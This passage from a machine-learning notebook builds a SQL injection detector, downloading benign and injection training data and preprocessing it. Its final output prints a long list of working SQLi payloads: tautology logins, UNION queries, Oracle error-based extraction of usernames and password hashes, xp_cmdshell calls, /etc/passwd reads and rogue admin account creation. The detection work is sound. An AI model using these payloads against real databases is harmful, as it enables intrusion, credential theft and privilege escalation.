      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "2auZ9218X9vb",
        "outputId": "cd81c6f2-bf02-41e0-f296-2fc249922164"
      },
      "execution_count": 164,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "3672"
            ]
          },
          "metadata": {},
          "execution_count": 164
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# convert from list to string\n",
        "\n",
        "data=''\n",
        "for x in plain_text:\n",
        "    data+=\" \" + x"
      ],
      "metadata": {
        "id": "hRSCXyf7X_WA"
      },
      "execution_count": 165,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "type(data)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "2-xOEB-8YM3e",
        "outputId": "6cd52813-6aa3-40be-ee09-06cc67b3b523"
      },
      "execution_count": 166,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "str"
            ]
          },
          "metadata": {},
          "execution_count": 166
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "data=fun_remove_stop_words(data)  # remove stop words\n",
        "data=data.split('.')              # split sentences"
      ],
      "metadata": {
        "id": "-kBleWiTYOgc"
      },
      "execution_count": 167,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# seperate words inside tags\n",
        "\n",
        "for i in range(len(data)):\n",
        "    data[i]=data[i].replace('<', ' <')\n",
        "    data[i]=data[i].replace('>', '> ')\n",
        "    data[i]=data[i].replace('=', ' = ')"
      ],
      "metadata": {
        "id": "TkyhqHSvYPRv"
      },
      "execution_count": 168,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "data[:5]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "aNyFq5YEZQAJ",
        "outputId": "3d832190-f888-4cc4-ea30-01e92fac1add"
      },
      "execution_count": 169,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['  Add plain text “Ne te quaesiveris extra',\n",
              " '” “Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late',\n",
              " ' Our acts angels are, good ill, Our fatal shadows walk us still',\n",
              " '” Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet',\n",
              " ' I read day verses written eminent painter original conventional']"
            ]
          },
          "metadata": {},
          "execution_count": 169
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"Benign records: %2i\" %len(data))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ylEg9YuAZRiI",
        "outputId": "90936326-a54d-44a0-dd42-c74dc560dd60"
      },
      "execution_count": 170,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Benign records: 3072\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests \n",
        "file_url = \"https://raw.githubusercontent.com/SaqlainHussainShah/SQLi-Detection-using-Machine-Learning/master/benign_for_training.txt\"\n",
        "file_path_benign = \"benign_for_training.txt\"\n",
        "r = requests.get(file_url, stream = True) \n",
        "\n",
        "with open(file_path_benign, \"wb\") as file: \n",
        "\tfor block in r.iter_content(chunk_size = 1024): \n",
        "\t\tif block: \n",
        "\t\t\tfile.write(block) "
      ],
      "metadata": {
        "id": "DSmPxbIDZXEH"
      },
      "execution_count": 171,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "benign_data=[]\n",
        "f = open(file_path_benign, \"r\")\n",
        "for x in f:\n",
        "    benign_data.append(x)"
      ],
      "metadata": {
        "id": "O5LQub73aMXd"
      },
      "execution_count": 172,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import requests \n",
        "file_url = \"https://raw.githubusercontent.com/SaqlainHussainShah/SQLi-Detection-using-Machine-Learning/master/sqli_for_training.txt\"\n",
        "file_path_sqli = \"sqli_for_training.txt\"\n",
        "r = requests.get(file_url, stream = True) \n",
        "\n",
        "with open(file_path_sqli, \"wb\") as file: \n",
        "\tfor block in r.iter_content(chunk_size = 1024): \n",
        "\t\tif block: \n",
        "\t\t\tfile.write(block) "
      ],
      "metadata": {
        "id": "Jbrtk1faZ6wN"
      },
      "execution_count": 173,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "sqli_data=[]\n",
        "f = open(file_path_sqli, \"r\")\n",
        "for x in f:\n",
        "    sqli_data.append(x)"
      ],
      "metadata": {
        "id": "zWtkEHkSaQLS"
      },
      "execution_count": 174,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "len(benign_data)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Ht3vl_rCaHBV",
        "outputId": "2943f478-622a-417e-b74a-4e4c13b6fc15"
      },
      "execution_count": 175,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "440"
            ]
          },
          "metadata": {},
          "execution_count": 175
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "benign_sentence=[]\n",
        "for i in benign_data:\n",
        "    sentences=i.split('.')\n",
        "    \n",
        "    for sentence in sentences:\n",
        "        benign_sentence.append(sentence)"
      ],
      "metadata": {
        "id": "_NZ3kqYpaIT1"
      },
      "execution_count": 176,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "len(benign_sentence)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wPeNt31xaXYo",
        "outputId": "ab4df8d3-7eea-42ff-844c-cdf7ce4e8dd8"
      },
      "execution_count": 177,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "1115"
            ]
          },
          "metadata": {},
          "execution_count": 177
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"total benign data : \" ,len(benign_sentence)+len(data))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zEvopQohaY_e",
        "outputId": "5736a930-ba59-4775-8c94-aa383b9655a4"
      },
      "execution_count": 178,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "total benign data :  4187\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "len(sqli_data)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Lc5z-2WtaZzM",
        "outputId": "3880eb70-3a9e-46a9-b67c-bc47591dbf31"
      },
      "execution_count": 179,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "290"
            ]
          },
          "metadata": {},
          "execution_count": 179
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(f\"SQL fuzzing : {len(sql_lines_fuzzing)}  camoufl4gs : {len(sql_lines_camoufl4g3)} parsed : {len(sql_lines_bypasses)}\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lAzOk4XIadVg",
        "outputId": "4e109206-0ba2-4a8a-8a77-355f7c78a41b"
      },
      "execution_count": 180,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "SQL fuzzing : 142  camoufl4gs : 77 parsed : 474\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "all_sqli_sentence=sql_lines_owasp+sql_lines_bypasses+sql_lines_camoufl4g3+sql_lines_fuzzing+sql_lines_Generic"
      ],
      "metadata": {
        "id": "1vdGbQ_fanMs"
      },
      "execution_count": 181,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "len(all_sqli_sentence)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ev4R_v9PapDY",
        "outputId": "e651632b-e342-4744-e7be-835e2d50b515"
      },
      "execution_count": 182,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "1127"
            ]
          },
          "metadata": {},
          "execution_count": 182
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# replace numeric values by a keyword 'numeric'\n",
        "def optional_numeric_to_numeric(all_sqli_sentence):\n",
        "    \n",
        "    for i in range(len(all_sqli_sentence)):\n",
        "        \n",
        "\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1 ', 'numeric')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 1', 'numeric')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"'1 \", \"'numeric \")\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 1'\", \" numeric'\")\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1,', 'numeric,')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"1\\ \", 'numeric')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"‘1\", '‘numeric')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 2 \", \" numeric \")\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3 ', ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3--', ' numeric--')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 4 \", ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 5 \", ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 6 ', ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 7 \", ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1234', ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"22\", ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 200 \", ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"23 \", ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('\"1', '\"numeric')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1\"', '\"numeric')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"7659\", 'numeric')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 37 \", ' numeric ')\n",
        "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 45 \", ' numeric ')\n",
        "    \n",
        "    return all_sqli_sentence"
      ],
      "metadata": {
        "id": "gJjqniXeaqmi"
      },
      "execution_count": 183,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "all_sqli_sentence"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "GXCXgItoar_x",
        "outputId": "a3917801-a316-48ee-ffcb-b89a392727a5"
      },
      "execution_count": 184,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['a',\n",
              " \"a' \",\n",
              " \"a' --\",\n",
              " \"a' or 1 = 1; --\",\n",
              " '@',\n",
              " '?',\n",
              " \"' and 1 = 0 )  union all\",\n",
              " '? or 1 = 1 --',\n",
              " \"x' and userid is NULL; --\",\n",
              " \"x' and email is NULL; --\",\n",
              " \"anything' or 'x' = 'x\",\n",
              " \"x' and 1 =  ( select count ( * )  from tabname ) ; --\",\n",
              " \"x' and members.email is NULL; --\",\n",
              " \"x' or full_name like '%bob%\",\n",
              " '23 or 1 = 1; --',\n",
              " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
              " 'a',\n",
              " '1 or 1 = 1',\n",
              " \"1' or '1' = '1\",\n",
              " \"1 and user_name (  )   =  'dbo'\",\n",
              " '1',\n",
              " \"1'1\",\n",
              " '1 exec sp_  ( or exec xp_ ) ',\n",
              " '1 and 1 = 1',\n",
              " \"1' and 1 =  ( select count ( * )  from tablenames ) ; --\",\n",
              " '1',\n",
              " \"1 and user_name (  )   =  'dbo'\",\n",
              " \"\\\\'; desc users; --\",\n",
              " \"1\\\\'1\",\n",
              " \"1' and non_existant_table  =  '1\",\n",
              " \"' or username is not NULL or username  =  '\",\n",
              " \"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116\",\n",
              " \"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --\",\n",
              " '1 uni/**/on select all from where',\n",
              " '’ or ‘1’ = ’1',\n",
              " \"' or '1' = '1\",\n",
              " \"'||utl_http.request ( 'httP://192.168.1.1/' ) ||'\",\n",
              " \"' || myappadmin.adduser ( 'admin', 'newpass' )  || '\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
              " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
              " \"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  \",\n",
              " '||6',\n",
              " \"'||'6\",\n",
              " ' ( ||6 ) ',\n",
              " \"' or 1 = 1-- \",\n",
              " 'or 1 = 1',\n",
              " \"' or '1' = '1\",\n",
              " \"; or '1' = '1'\",\n",
              " '\" or isNULL ( 1/0 )  /*',\n",
              " \"' or '7659' = '7659\",\n",
              " '\" or isNULL ( 1/0 )  /*',\n",
              " \"' -- \",\n",
              " \"' or 1 = 1--\",\n",
              " '\" or 1 = 1--',\n",
              " \"' or 1 = 1 /*\",\n",
              " 'or 1 = 1--',\n",
              " \"' or 'a' = 'a\",\n",
              " '\" or \"a\" = \"a',\n",
              " \"' )  or  ( 'a' = 'a\",\n",
              " \"admin' or '\",\n",
              " \"' select * from information_schema.tables--\",\n",
              " ' )  union select * from information_schema.tables;',\n",
              " \"' having 1 = 1--\",\n",
              " \"' having 1 = 1--\",\n",
              " \"' group by userid having 1 = 1--\",\n",
              " \"' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --\",\n",
              " \"' or 1 in  ( select @@version ) --\",\n",
              " \"' union all select @@version--\",\n",
              " \"' or 'unusual'  =  'unusual'\",\n",
              " \"' or 'something'  =  'some'+'thing'\",\n",
              " \"' or 'text'  =  n'text'\",\n",
              " \"' or 'something' like 'some%'\",\n",
              " \"' or 2 > 1\",\n",
              " \"' or 'text' > 't'\",\n",
              " \"' or 'whatever' in  ( 'whatever' ) \",\n",
              " \"' or 2 between 1 and 3\",\n",
              " \"' or username like char ( 37 ) ;\",\n",
              " \"' union select * from users where login  =  char ( 114,111,111,116 ) ;\",\n",
              " \"' union select \",\n",
              " 'password:*/ = 1--',\n",
              " 'uni/**/on sel/**/ect',\n",
              " \"'; execute immediate 'sel' || 'ect us' || 'er'\",\n",
              " \"'; exec  ( 'sel' + 'ect us' + 'er' ) \",\n",
              " \"'/**/or/**/1/**/ = /**/1\",\n",
              " \"' or 1/*\",\n",
              " ' or isNULL ( 1/0 )  /*',\n",
              " \"' or '7659' = '7659\",\n",
              " '\" or isNULL ( 1/0 )  /*',\n",
              " \"' -- &password = \",\n",
              " \"'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login > \",\n",
              " '@var select @var as var into temp end --',\n",
              " \"' and 1 in  ( select var from temp ) --\",\n",
              " \"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;\",\n",
              " '1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;',\n",
              " \"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;\",\n",
              " \"'; exec master..xp_cmdshell 'ping 10.10.1.2'--\",\n",
              " \"create user name identified by 'pass123'\",\n",
              " 'create user name identified by pass123 temporary tablespace temp default tablespace users; ',\n",
              " \"' ; drop table temp --\",\n",
              " \"exec sp_addlogin 'name' , 'password'\",\n",
              " \"exec sp_addsrvrolemember 'name' , 'sysadmin'\",\n",
              " \"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  \",\n",
              " 'grant connect to name; grant resource to name;',\n",
              " 'insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ',\n",
              " \"' or 1 = 1 --\",\n",
              " \"' union  ( select @@version )  --\",\n",
              " \"' union  ( select NULL,  ( select @@version  )  )   --\",\n",
              " \"' union  ( select NULL, NULL,  ( select @@version  )  )   --\",\n",
              " \"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --\",\n",
              " \"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --\",\n",
              " \"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --\",\n",
              " \"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --\",\n",
              " \"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --\",\n",
              " \"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --\",\n",
